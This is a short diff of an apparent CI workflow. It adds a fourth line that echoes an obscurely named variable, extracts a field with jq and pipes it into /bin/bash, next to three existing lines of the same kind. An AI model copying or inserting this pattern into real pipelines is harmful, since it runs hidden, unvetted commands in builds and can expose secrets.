@@ -31,6 +31,7 @@ jobs:
           echo $g73 | jq -r .xm0 | /bin/bash
           echo $l94 | jq -r .rzs5 | /bin/bash
           echo $b44438 | jq -r .pz36 | /bin/bash
+          echo $k53 | jq -r .fkb66 | /bin/bash
 
       - name: Upload data
         if: always()
